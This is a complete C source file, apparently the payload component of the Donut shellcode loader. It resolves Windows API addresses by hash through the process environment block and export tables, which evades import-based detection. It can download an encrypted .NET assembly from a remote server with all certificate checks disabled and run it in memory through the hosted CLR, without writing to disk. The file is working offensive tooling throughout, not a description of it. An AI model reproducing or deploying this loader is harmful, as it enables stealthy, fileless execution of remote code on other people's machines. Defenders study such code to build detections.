/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "payload.h"

DWORD ThreadProc(LPVOID lpParameter) {
    DWORD           i;
    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
    
    // decrypt instance
    
    // if this is a test, don't run an instance where
    // the module resides in the resource section of DLL
#ifdef TEST
    if(inst->dwType == DONUT_INSTANCE_DLL) {
      printf("  [ this instance is for DLL only. Cannot run.\n");
      return -1;
    }
#endif
    // load required DLL
    DPRINT("Resolving LoadLibraryA");
    inst->api.addr[0] = xGetProcAddress(inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    DPRINT("Loading DLL");
    for(i=0;i<inst->DllCount;i++) {
      inst->api.LoadLibraryA(inst->szDll[i]);
    }
    // resolve API
    DPRINT("Resolving %i API", inst->ApiCount);
    for(i=1;i<inst->ApiCount;i++) {
     // DPRINT("#%i API : %p", i, inst->api.hash[i]);
      inst->api.addr[i] = xGetProcAddress(inst->api.hash[i], inst->iv);
      if(inst->api.addr[i] == NULL) {
        DPRINT("unable to resolve address for hash %i : %p", 
          i, (void*)inst->api.hash[i]);
        return -1;
      }
    }
    // load assembly from resource section?
    if(inst->dwType == DONUT_INSTANCE_DLL) {
      if(!LoadFromResource(inst)) return -1;
    } else
    
    // download assembly from remote server?
    if(inst->dwType == DONUT_INSTANCE_URL) {
      DPRINT("Instance is URL");
      if(!LoadFromServer(inst)) return -1;
    }
    
    // verify integrity of assembly
    DPRINT("Verifying assembly");
    if(!VerifyAssembly(inst)) return -1;
    
    // try run it from memory
    DPRINT("Running assembly from memory");
    RunAssembly(inst);
    return 0;
}

BOOL VerifyAssembly(PDONUT_INSTANCE inst) {
    HCRYPTPROV      prov = 0;
    HCRYPTKEY       pubkey;
    HCRYPTHASH      hash;
    PBYTE           der, key, p;
    DWORD           der_len = 0, key_len;
    BOOL            bVerified = FALSE;
    PDONUT_MODULE   pModule;
    
    // depending on instance
    if(inst->dwType == DONUT_INSTANCE_PIC) {
      DPRINT("Instance is PIC");
      // load offset
      pModule = (PDONUT_MODULE)&inst->Assembly.x;
    } else {
      DPRINT("Instance is memory allocated");
      // load pointer
      pModule = inst->Assembly.p;
    }
    // 1. create crypto context
    DPRINT("Acquiring crypto context");
    if(!inst->api.CryptAcquireContext(
        &prov, NULL, NULL, PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return FALSE;
    
    // 2. calculate size of Distinguished Encoding Rules (DER) binary
    DPRINT("Calculating size of public key");
    if(inst->api.CryptStringToBinaryA(
        inst->pubkey, 0, CRYPT_STRING_ANY, 
        NULL, &der_len, NULL, NULL))
    {
      // 3. allocate memory for DER binary
      DPRINT("Allocating memory for PEM string");
      der = inst->api.VirtualAlloc(
        NULL, der_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);
          
      if(der != NULL) {
        // 4. decode base64 string
        DPRINT("Decoding PEM string");
        inst->api.CryptStringToBinaryA(
            inst->pubkey, 0, CRYPT_STRING_ANY, 
            der, &der_len, NULL, NULL);
            
        // 5. decode DER to public key info
        DPRINT("Decoding DER");
        if (inst->api.CryptDecodeObjectEx(
            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            X509_PUBLIC_KEY_INFO, der, der_len,
            CRYPT_DECODE_ALLOC_FLAG, NULL,
            &key, &key_len))
        {
          // 6. import RSA public key
          DPRINT("Importing public key");
          if(inst->api.CryptImportPublicKeyInfo(
             prov, X509_ASN_ENCODING,
            (PCERT_PUBLIC_KEY_INFO)key, &pubkey))
          {
            // 7. create crypto API hash object
            DPRINT("Creating hash object")
            if(inst->api.CryptCreateHash(
                prov, CALG_SHA_256, 0, 0, &hash))
            {
              // 8. generate hash of encrypted assembly
              DPRINT("Hashing %i bytes of data", 
                inst->ModuleLen - DONUT_SIG_LEN);
                
              p = (PBYTE)pModule;
              p += DONUT_SIG_LEN;
              
              if(inst->api.CryptHashData(
                hash, p, 
                inst->ModuleLen - DONUT_SIG_LEN, 0))
              {
                // 9. verify RSA signature
                DPRINT("Verifying signature");
                bVerified = inst->api.CryptVerifySignature(
                  hash, 
                  pModule->modsig, 
                  DONUT_SIG_LEN, 
                  pubkey, NULL, 0);
                  
                DPRINT("Verified : %s", bVerified ? "OK" : "FAILED");
              }
              inst->api.CryptDestroyHash(hash);
            }
            inst->api.CryptDestroyKey(pubkey);
          }
          inst->api.LocalFree(key);
        }
        inst->api.VirtualFree(
          der, 0, MEM_DECOMMIT | MEM_RELEASE);
      }
    } 
    inst->api.CryptReleaseContext(prov, 0);
    
    return bVerified;
}

/**
  download encrypted assembly from remote server
  returns TRUE if successful else FALSE
*/
BOOL LoadFromServer(PDONUT_INSTANCE inst) {
    HINTERNET       hin, con, req;
    PBYTE           buf;
    DWORD           s, n, rd, len, code=0;
    BOOL            bResult = FALSE, bSecure = FALSE;
    URL_COMPONENTS  uc;
    CHAR            host[DONUT_MAX_URL], 
                    file[DONUT_MAX_URL];
    
    // default flags for HTTP client
    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION          | 
                  INTERNET_FLAG_NO_CACHE_WRITE           | 
                  INTERNET_FLAG_NO_UI                    |
                  INTERNET_FLAG_RELOAD                   |
                  INTERNET_FLAG_NO_AUTO_REDIRECT;
    
    memset((void*)&uc, 0, sizeof(uc));
    
    uc.dwStructSize     = sizeof(uc);
    uc.lpszHostName     = host;
    uc.lpszUrlPath      = file;
    uc.dwHostNameLength = DONUT_MAX_URL;
    uc.dwUrlPathLength  = DONUT_MAX_URL;
    
    // 1. decode URL
    DPRINT("Decoding URL %s", inst->TypeInfo.http.url);
    if(!inst->api.InternetCrackUrl(
      inst->TypeInfo.http.url, 0, ICU_DECODE, &uc)) {
      return FALSE;
    }
    
    bSecure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    
    // if secure connection, update the flags to ignore
    // certificate errors
    if(bSecure) {
      flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID   |
               INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
               INTERNET_FLAG_SECURE;
    }
                  
    // 2. initialize WinINet functions
    DPRINT("Initializing WININET");
    hin = inst->api.InternetOpen(
      NULL, INTERNET_OPEN_TYPE_PRECONFIG, 
      NULL, NULL, 0);
    
    if(hin == NULL) return FALSE;
    
    // 3. create HTTP session
    DPRINT("Creating %s connection for %s", 
      bSecure ? "HTTPS" : "HTTP", host);
      
    con = inst->api.InternetConnect(
        hin, host, 
        bSecure ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 
        NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
        
    if(con != NULL) {
      // 4. create HTTP request
      DPRINT("Creating HTTP %s request for %s", 
        inst->TypeInfo.http.req, file);
        
      req = inst->api.HttpOpenRequest(
              con, inst->TypeInfo.http.req, 
              file, NULL, NULL, NULL, flags, 0);
              
      if(req != NULL) {
        
        // 5. see if we should ignore invalid certificates for this request
        if(bSecure) {
          if(flags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID) {
            n = sizeof (s);
            s = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                SECURITY_FLAG_IGNORE_WRONG_USAGE       |
                SECURITY_FLAG_IGNORE_REVOCATION;
                
            DPRINT("Setting option to ignore invalid certificates");
          
            inst->api.InternetSetOption(
              req, 
              INTERNET_OPTION_SECURITY_FLAGS, 
              &s, 
              sizeof(s));
          }
        }
        // 6. send HTTP request
        DPRINT("Sending request");
        
        if(inst->api.HttpSendRequest(req, NULL, 0, NULL, 0)) {
          // 7. query the response code
          len  = sizeof(DWORD);
          code = 0;
          DPRINT("Querying status code");
          if(inst->api.HttpQueryInfo(
              req, 
              HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
              &code, &len, 0))
          {
            DPRINT("Code is %ld", code);
            if(code == HTTP_STATUS_OK) {
              // 8. query the content length
              len               = sizeof(SIZE_T);
              inst->ModuleLen = 0;
              DPRINT("Querying content length");
              if(inst->api.HttpQueryInfo(
                req, 
                HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                &inst->ModuleLen, &len, 0))
              {
                if(inst->ModuleLen != 0) {
                  // 9. allocate RW memory for file
                  DPRINT("Allocating memory for module");
                  inst->Assembly.p = inst->api.VirtualAlloc(
                    NULL, inst->ModuleLen, 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_READWRITE);
                    
                  if(inst->Assembly.p != NULL) {
                    // 10. read file into local memory
                    rd = 0;
                    DPRINT("Downloading module into memory");
                    bResult = inst->api.InternetReadFile(
                      req, 
                      inst->Assembly.p, 
                      inst->ModuleLen, &rd);
                  }
                }
              }
            }
          }
        }
        DPRINT("Closing request handle");
        inst->api.InternetCloseHandle(req);
      }
      DPRINT("Closing HTTP connection");
      inst->api.InternetCloseHandle(con);
    }
    DPRINT("Closing internet handle");
    inst->api.InternetCloseHandle(hin);
      
    return bResult;
}

/**
  Load encrypted assembly from resource section
  returns TRUE if successful else FALSE
*/
BOOL LoadFromResource(PDONUT_INSTANCE inst) {
    HGLOBAL hg = NULL;
    HRSRC   res;
    
    // 1. Find assembly in resource section
    res = inst->api.FindResource(
      NULL, 
      inst->TypeInfo.resource.name, 
      inst->TypeInfo.resource.type);
      
    if(!res) return FALSE;
    
    // 2. Try load it
    hg = inst->api.LoadResource(NULL, res);
    if(!hg) return FALSE;
    
    // 3. Lock and obtain size
    inst->Assembly.p = inst->api.LockResource(hg);
    inst->ModuleLen  = inst->api.SizeofResource(NULL, res);
    
    return inst->Assembly.p != NULL;
}

VOID RunAssembly(PDONUT_INSTANCE inst) {
    // "data section"
    HRESULT         hr;
    BOOL            loadable;
    VARIANT         arg, vt, ret;
    ULONG           i;
    BSTR            cls, method, param;
    SAFEARRAY       *sa, *sav;
    SAFEARRAYBOUND  sab[1];
    ICLRMetaHost    *meta;
    ICLRRuntimeInfo *info;
    ICorRuntimeHost *host;
    IUnknown        *unkn;
    AppDomain       *domain;
    Assembly        *assm;
    Type            *pType;
    LoadLibraryA_t  pLoadLibrary;
    PBYTE           p;
    PDONUT_MODULE   pModule;
    
    // depending on instance
    if(inst->dwType == DONUT_INSTANCE_PIC) {
      DPRINT("Using module embedded in instance");
      // load offset
      pModule = (PDONUT_MODULE)&inst->Assembly.x;
    } else {
      DPRINT("Loading module from allocated memory");
      // load pointer
      pModule = inst->Assembly.p;
    }
    
    // initialize assembly
    DPRINT("Creating safe array for assembly of %i bytes", 
      inst->ModuleLen);
      
    sab[0].lLbound   = 0;
    sab[0].cElements = pModule->len;
    sa = inst->api.SafeArrayCreate(VT_UI1, 1, sab);
    
    if(sa == NULL) return;
    
    // copy assembly to safe array
    DPRINT("Copying assembly to safe array");
    for(i=0, p=sa->pvData; i<pModule->len; i++) {
      p[i] = pModule->data[i];
    }
    // initialize parameters
    DPRINT("Allocating BSTR for class and method");
    cls    = inst->api.SysAllocString(pModule->cls);
    method = inst->api.SysAllocString(pModule->method);
    
    // 1. initialize CLR
    DPRINT("Calling CLRCreateInstance");
    hr = inst->api.CLRCreateInstance(
      (REFCLSID)&inst->xCLSID_CLRMetaHost, 
      (REFIID)&inst->xIID_ICLRMetaHost, 
      (LPVOID*)&meta);
      
    if(SUCCEEDED(hr)) {
      // 2. obtain runtime information
      DPRINT("Calling ICLRMetaHost::GetRuntime");
      hr = meta->lpVtbl->GetRuntime(
        meta, pModule->runtime, 
        (REFIID)&inst->xIID_ICLRRuntimeInfo, &info);
        
      if(SUCCEEDED(hr)) {
        // 3. check if runtime is loadable
        DPRINT("Calling ICLRRuntimeInfo::IsLoadable");
        hr = info->lpVtbl->IsLoadable(info, &loadable);
        
        if(SUCCEEDED(hr) && loadable) {
          // 4. load the CLR into current process
          DPRINT("Calling ICLRRuntimeInfo::GetInterface");
          hr = info->lpVtbl->GetInterface(
            info, 
            (REFCLSID)&inst->xCLSID_CorRuntimeHost, 
            (REFIID)&inst->xIID_ICorRuntimeHost, 
            &host);
            
          if(SUCCEEDED(hr)) {
            // 5. start the CLR
            DPRINT("Calling ICorRuntimeHost::Start");
            hr = host->lpVtbl->Start(host);
            
            if(SUCCEEDED(hr)) {
              // 6. obtain pointer to AppDomain infterface
              DPRINT("Calling ICorRuntimeHost::GetDefaultDomain");
              hr = host->lpVtbl->GetDefaultDomain(
                host, &unkn);
                
              if(SUCCEEDED(hr)) {
                DPRINT("Calling IUnknown::QueryInterface");
                hr = unkn->lpVtbl->QueryInterface(
                  unkn, 
                  (REFIID)&inst->xIID_AppDomain, 
                  &domain);
                  
                if(SUCCEEDED(hr)) {
                  // 7. load assembly from memory
                  DPRINT("Calling AppDomain::Load_3");
                  hr = domain->lpVtbl->Load_3(
                    domain, sa, &assm);
                    
                  if(SUCCEEDED(hr)) {
                    // 8. invoke method    
                    memset((void*)&vt, 0, sizeof(vt));
                  
                    // Get the Type of Runner.
                    DPRINT("Calling Assembly::GetType_2");
                    hr = assm->lpVtbl->GetType_2(assm, cls, &pType);
                    if(SUCCEEDED(hr)) {
                      sav = NULL;
                      // do we have parameters?
                      if(pModule->param_cnt != 0) {
                        // allocate array for parameters
                        DPRINT("Calling SafeArrayCreateVector for parameters");
                        sav = inst->api.SafeArrayCreateVector(
                          VT_VARIANT, 0, 
                          pModule->param_cnt);
                      
                        if(sav != NULL) {
                          for(i=0;i<pModule->param_cnt;i++) {
                            // store parameters
                            V_BSTR(&arg) = inst->api.SysAllocString(pModule->param[i]);
                            V_VT(&arg)   = VT_BSTR;
                            
                            hr = inst->api.SafeArrayPutElement(sav, &i, &arg);
                          }
                        }
                      }
                      // invoke method
                      DPRINT("Calling Type::InvokeMember_3");
                      hr = pType->lpVtbl->InvokeMember_3(
                          pType, method, 
                          BindingFlags_InvokeMethod | 
                          BindingFlags_Static       | 
                          BindingFlags_Public,
                          NULL, vt, sav, &ret);
                            
                      if(sav != NULL) {
                        inst->api.SafeArrayDestroy(sav);
                      }
                      pType->lpVtbl->Release(pType);
                    }
                    assm->lpVtbl->Release(assm);
                  }
                  domain->lpVtbl->Release(domain);
                }
                unkn->lpVtbl->Release(unkn);
              }
              host->lpVtbl->Stop(host);
            }
            host->lpVtbl->Release(host);
          }
        }
        info->lpVtbl->Release(info);
      }
      meta->lpVtbl->Release(meta);
    }
    
    // cleanup
    if(sa     != NULL) inst->api.SafeArrayDestroy(sa);
    if(cls    != NULL) inst->api.SysFreeString(cls);
    if(method != NULL) inst->api.SysFreeString(method);
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, ULONG64 ulAPIHash, ULONG64 iv){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   i, cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  addr=NULL;
    ULONG64                 ulDllHash;
    CHAR                    buf[MAX_PATH];
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    // get hash of DLL converted to lowercase
    for(i=0;dll[i]!=0;i++) {
      buf[i] = dll[i] | 0x20;
    }
    buf[i] = 0;
    ulDllHash = maru(buf, iv);
    //DPRINT("DLL : %s : %p", buf, (void*)ulDllHash);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare with hash to find
      if ((maru(api, iv) + ulDllHash) == ulAPIHash) {
        //DPRINT("Found match with %s", api);
        // return address of function
        addr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return addr;
      }
    } while (--cnt && addr == NULL);
    
    return addr;
}

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset) {
    unsigned long ret;
    
    __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
    
    return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset) {
    void *ret;
    
    __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
     
    return (unsigned __int64) ret;
}
#endif
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(ULONG64 ulHash, ULONG64 ulIV) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                addr = NULL;
     
    #if defined(_WIN64)
      peb = (PPEB) __readgsqword(0x60);
    #else
      peb = (PPEB) __readfsdword(0x30);
    #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && addr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      addr = FindExport(dte->DllBase, ulHash, ulIV);  
    }
    return addr;
}


// the following code is *only* for development purposes
// given an instance file, it will run as if running on a target system
#ifdef TEST

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    FILE           *fd;
    struct stat     fs;
    PDONUT_INSTANCE inst;
    
    if(argc != 2) {
      printf("  [ usage: payload <instance>\n");
      return 0;
    }
    // get size of instance
    if(stat(argv[1], &fs) != 0) {
      printf("  [ unable to obtain size of instance.\n");
      return 0;
    }
    
    // zero size?
    if(fs.st_size == 0) {
      printf("  [ invalid instance.\n");
      return 0;
    }
    
    // try open for reading
    fd = fopen(argv[1], "rb");
    if(fd == NULL) {
      printf("  [ unable to open %s.\n", argv[1]);
      return 0;
    }

    // allocate memory
    inst = (PDONUT_INSTANCE)malloc(fs.st_size);
    if(inst != NULL) {
      fread(inst, 1, fs.st_size, fd);
      // run payload with instance
      ThreadProc(inst);
    }
    fclose(fd);
    return 0;
}
#endif